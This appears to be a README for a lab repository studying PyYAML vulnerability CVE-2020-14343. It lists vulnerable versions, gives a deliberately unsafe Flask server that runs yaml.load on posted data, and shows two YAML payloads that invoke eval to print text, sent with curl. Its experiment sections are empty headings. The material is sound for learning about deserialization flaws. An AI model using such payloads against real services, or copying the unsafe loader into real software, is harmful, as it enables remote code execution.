=====================
pyyaml-CVE-2020-14343
=====================
Experimenting with the PyYAML vulnerability `CVE-2020-14343`_.

`:warning:`

  **Disclaimer**

  This repository is for educational and informational purposes 
  only. The author, raul23, assumes no responsibility for the use 
  of this repository, code or any informaton contained therein. 
  The user is solely responsible for any action he/she takes with 
  this repository, code and information contained in it.

  Do not abuse this material. Be responsible.

.. contents:: **Contents**
   :depth: 3
   :local:
   :backlinks: top

Testing environment
===================
- **Execution platform:** macOS with `conda`_ (environment manager)
- **Python prerequisites:**

  - `pyyaml`_: multiple versions of PyYAML were tested
  
    - ``pyyaml`` 3.13 (Jul 5, 2018) - vulnerable
    - ``pyyaml`` 5.1 (Mar 13, 2019) - vulnerable
    - ``pyyaml`` 5.3 (Jan 6, 2020) - vulnerable
    - ``pyyaml`` 5.4 (Jan 19, 2021) - not vulnerable
    
    `:information_source:`

      The vulnerability `CVE-2020-14343`_ was fixed in PyYAML version 5.4 [BUG]_
      
  - `flask`_ (OPTIONAL): for building a simple server that will read a payload sent 
    as a file containing the risky *yaml* syntax. If you don't have *flask*, then
    a simple web server implemented with built-in Python modules will be used.
    
    `:star:`
     
      The version choosen for ``flask`` is not that important. Just get the
      latest (v1.1.2) or if you already had installed it, the version you have 
      should be good enough for the tests. What is important is the version of 
      ``pyyaml``

Code
====
The code consists of Python web server and a 

Web server
----------
The Python code for the server is the following:

.. code-block:: Python

   from flask import Flask, request
   import yaml
   import re
   import os

   app = Flask(__name__)
   app.secret_key = os.urandom(16)


   @app.route('/test', methods=["POST"])
   def pwnme():
       if not re.fullmatch(b"^[\n --/-\]a-}]*$", request.data, flags=re.MULTILINE):
           return "Nice try!", 400
       return yaml.load(request.data)

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=8080)

`:information_source:`

  * The server code is based from a note published @ hackmd.io by *harrier-lcc* [HAR]_
  * The regex ``^[\n --/-\]a-}]*$`` doesn't match any string that has one of the following
    special characters:
    
    - ``.`` (Full stop; period)
    - ``^`` (Circumflex)
    - ``_`` (Underscore)
    - ````` (Backtick)
    - ``~``	(Tilde)

.. fixed: ^[\n --\/-\]a-}]*$

Payloads
--------
The payload is sent to the server as a ``txt`` file based on the 
*yaml* syntax via the ``curl`` command:

.. code-block:: terminal

   $ curl -F file=@payload{NUMBER}.txt http://0.0.0.0:8080
   
where ``payload{NUMBER}.txt`` is one of the following payloads:

- ``payload01.txt``:

  .. code-block:: terminal
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('test') ]
       
- ``payload02.txt``:

  .. code-block:: terminal
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('invalid_syntax') ]


Experiments
===========
The following experiments consist in running a `simple
web server`_ that will read a payload sent
via the ``curl`` command. Also, each experiment is
associated to a specific version of ``pyyaml``.

Experiment 1: ``pyyaml`` 3.13
-----------------------------
Experiment 2: ``pyyaml`` 5.1
----------------------------
Experiment 3: ``pyyaml`` 5.3
----------------------------
Experiment 4: ``pyyaml`` 5.4
----------------------------

.. 
 Part II: More experiments
 =========================
 The following experiments consist in testing only ``pyyaml`` version 5.3 which 
 is affected by `CVE-2020-14343`_. The code used for each of the following experiments
 is different unlike the experiments in Part I which all share a common code (server and
 payloads).

References
==========
.. [BUG] “Bug 1860466 – (CVE-2020-14343) CVE-2020-14343 PyYAML: Incomplete Fix for CVE-2020-1747.” 
   *Redhat.Com*, https://bugzilla.redhat.com/show_bug.cgi?id=1860466. Accessed 30 June 2021.

.. [HAR] “Uiuctf 2020 - HackMD.” *Hackmd.Io*, https://hackmd.io/@harrier/uiuctf20. 
   Accessed 30 June 2021.

.. URLs
.. _conda: https://docs.conda.io/projects/conda/en/latest/user-guide/getting-started.html
.. _CVE-2020-14343: https://access.redhat.com/security/cve/cve-2020-14343
.. _flask: https://flask.palletsprojects.com/
.. _pyyaml: https://pypi.org/project/PyYAML/

.. URLs internal
.. _simple web server: #code
